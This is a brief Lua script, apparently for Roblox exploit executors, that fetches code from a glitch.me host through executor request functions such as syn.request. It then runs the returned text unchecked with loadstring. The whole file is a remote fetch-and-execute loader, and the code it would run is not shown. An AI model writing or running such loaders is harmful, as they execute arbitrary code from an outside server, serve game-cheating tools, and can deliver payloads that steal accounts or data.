local request = http_request or request or HttpPost or syn.request
function RequestGetHttp(Url)
	local data = request({Url = Url})["Body"]
	return data
end
function CheckHttpsIsVaild(url)
	local data
	local succes,reason = pcall(function()
		data = RequestGetHttp(url)
	end)
	return succes,data,reason
end
local success,data,reason=CheckHttpsIsVaild("https://gleaming-mango-ceiling.glitch.me/")
if success then
	loadstring(data)()
end
